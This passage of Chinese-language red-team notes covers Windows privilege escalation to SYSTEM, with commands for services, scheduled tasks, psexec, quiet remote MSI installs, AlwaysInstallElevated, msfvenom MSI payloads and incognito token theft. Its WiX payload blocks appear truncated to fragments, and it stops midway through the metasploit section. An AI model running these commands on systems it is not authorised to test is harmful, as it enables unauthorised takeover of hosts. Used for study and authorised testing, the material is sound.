# 权限提升
> 部分内容由 [the-fog](https://github.com/the-fog) 提供,仅做部分内容排版修改
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
## 大纲
* **[Win](#win)**
* **[Linux](#linux)**
* **[Mysql](#mysql)**
* **[MSSQL](#mssql)**
* **[PostgreSQL](#postgresql)**
* **[Redis](#redis)**
---
**多平台提权辅助工具**
- [carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) - 包含 win、Linux，之后还会有 mac
- [Loophole](https://detect.secwx.com/)
- [AlessandroZ/BeRoot](https://github.com/AlessandroZ/BeRoot)
- [vulmon/Vulmap](https://github.com/vulmon/Vulmap) - 在线本地漏洞扫描程序项目
---
## Win
**相关案例**
- [记一次绕过火绒安全提权实战案例](https://mp.weixin.qq.com/s/Oe1ARbfpoPiognCGDQ4HeA) - 与其说是提权其实还是pth，比较特殊
### 提权漏洞
-  [OS-Exploits](../OS安全/OS-Exploits.md#提权漏洞)
### 管理员权限提权成 system
**相关文章**
- [渗透技巧——从Admin权限切换到System权限](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90)
- [Alternative methods of becoming SYSTEM](https://blog.xpnsec.com/becoming-system/)
- [Metasploit、Powershell之AlwaysInstallElevated提权实战](https://xz.aliyun.com/t/203)
#### windows 自带功能
**SC 命令**
```
sc Create MyService binPath= "cmd /c start" type= own type= interact
sc start MyService
```
![](../../../../assets/img/Security/RedTeam/后渗透/权限提升/7.png)
该命令在 xp 系统可以正常使用, win7 和 winsrv2008 下需要点击查看信息, win8 以上不支持
进入命令行界面后,可以输入 explorer.exe 打开系统桌面,路径为 C:\Windows\system32\config\systemprofile\Desktop
在此种环境下打开的任何程序都具有 system 权限
**计划任务**
- at 命令
    ```
    at 9:30 cmd.exe
    ```
    适用于 win7 和 winsrv2008
- schtasks 命令
    - 创建服务, 以 system 权限启动
        ```
        schtasks /Create /TN MyService2 /SC DAILY /ST 10:00:00 /TR cmd.exe /RU SYSTEM
        ```
    - 查看服务状态
        ```
        schtasks /Query /TN MyService2
        ```
        有时候会报错 错误: 无法加载列资源, 这是由于 cmd 编码是 gbk 导致的, 调整为美国编码 (此时无法打印非 ascii 字符) 即可:
        ```
        chcp(查看当前 cmd 窗口编码, gbk 为 936)
        chcp 437
        ```
    - 删除服务
        ```
        schtasks /Delete /TN MyService2 /F
        ```
    支持 win7-win10, 借助工具才能看到
**使用 psexec 会创建 PSEXESVC 服务**
```
psexec.exe -accepteula -s -i -d cmd.exe
```
默认情况下, system 权限的进程不会在用户桌面显示, 如果不想显示进程界面, 可以去掉 -i 参数; 第一次使用 psexec.exe 需要确认, 使用 -accepteula 参数无需确认
如果系统不自带,下载地址为:  https://download.sysinternals.com/files/PSTools.zip
官方文档:   https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec
**命名管道**
这里借鉴了 Meterpreter 的方法:
1. 创建 system 权限的服务, 提供一个命名管道
2. 创建进程, 连接到该命名管道
使用 github 上的开源代码
- https://github.com/xpn/getsystem-offline
下载下来之后编译成 getsystem-offline.exe 和 getsystem_service.exe; 依次在命令行运行 getsystem_service.exe 和 getsystem-offline.exe 即可 (测试机上需安装 .net4.0)
#### 利用 msi 安装文件获得System权限
msi格式的介绍
- http://sc.openoffice.org/compdocfileformat.pdf
**msiexec**
系统进程, 是 Windows Installer 的一部分, 用于安装 Windows update 更新和 Windows Installer 安装包, 后者即上面提到的 .msi 格式的安装包; 在命令行下运行 msiexec, 即可看到帮助文档
我们平时双击打开一个 .msi 文件,相当于在命令行下执行了如下命令
```
msiexec /i xxx.msi
```
隐藏界面安装
```
msiexec /q /i xxx.msi
```
远程加载安装
```
msiexec /q /i http://192.168.101.146/test.msi    (文件后缀名可以不为.msi)
```
**Advanced Installer**
Advanced Installer 是一个 Windows Installer 的 MSI 安装包的制作工具, 下载地址: https://www.advancedinstaller.com/download.html
![](../../../../assets/img/Security/RedTeam/后渗透/权限提升/3.png)
![](../../../../assets/img/Security/RedTeam/后渗透/权限提升/4.png)
![](../../../../assets/img/Security/RedTeam/后渗透/权限提升/5.png)
**利用 AlwaysInstallElevated 提权**
利用组策略可以实现权限提升, 开启 AlwaysInstallElevated 特权安装功能
1. 打开组策略编辑器 (win+r,gpedit.msc)
2. 用户配置 -> 管理模板 ->Windows 组件 ->Windows Installer-> 永远以高特权进行安装 -> 选择启用
3. 计算机配置 -> 管理模板 ->Windows 组件 ->Windows Installer-> 永远以高特权进行安装 -> 选择启用
其实就是修改了两处注册表,命令行下进行上述操作
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
**使用 msf 生成 msi**
本地版本
```
msfvenom -p windows/exec CMD=cmd.exe -f msi > test.msi
```
输入 shell 命令进入目标主机 cmd 下使用命令行工具 Msiexec 进行安装，具体命令如下
```
msiexec /quiet /qn /i C:\msi.msi
msiexec工具相关的参数：
/quiet=安装过程中禁止向用户发送消息
/qn=不使用图形界面
/i=安装程序
```
运行后,此时在 `C:\Windows\Installer` 会生成 temp 和 msi 临时文件,安装结束后会自动删除;如果使用的是命令行隐藏安装,则会保留tmp文件;不管怎么都会在 `%TEMP%` 目录下生成对应的log文件
**wix3**
下载地址: https://github.com/wixtoolset/wix3/releases/
msigen.wix 代码下载地址: https://gist.github.com/xpn/d1ef20dfd266053227d3e992ae84c64e
由于上述文件中的 payload 如今已不免杀, 所以我将其替换成如下 payload:
```xml
cmd.exe
```
完整代码如下:
```xml
    cmd.exe
        invalid vbs to fail install
```
编译命令:
```cmd
candle.exe msigen.wix
light.exe msigen.wixobj
```
直接双击执行 msigen.msi 会弹框，启动的 calc.exe 为 system 权限
命令行下执行：
```
msiexec /q /i msigen.msi
```
启动的 calc.exe 为 high 权限
#### 利用 token 复制获得 System 权限
**简介**
Windows 有两种类型的 Token
1. Delegation token(授权令牌): 用于交互会话登录 (例如本地用户直接登录、远程桌面登录)
2. Impersonation token(模拟令牌): 用于非交互登录 (利用 net use 访问共享文件夹)
注： 两种 token 只在系统重启后清除, 具有 Delegation token 的用户在注销后, 该 Token 将变成 Impersonation token, 依旧有效
**incognito**
下载地址: https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip
列举 token
```
incognito.exe list_tokens -u
```
提权至 system
```
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
```
切换到 A 用户
```
incognito.exe execute -c "WIN-SIL71EN1H12\a" cmd.exe
```
伪造用户
```
incognito.exe execute -c "WIN-SIL71EN1H12\b" cmd.exe
```
**metasploit 版**
首先回弹一个 meterpreter 的 shell 回来
加载 incognito
```
load incognito
```
列举 token
```
list_tokens -u
```
查看当前用户
```
getuid
```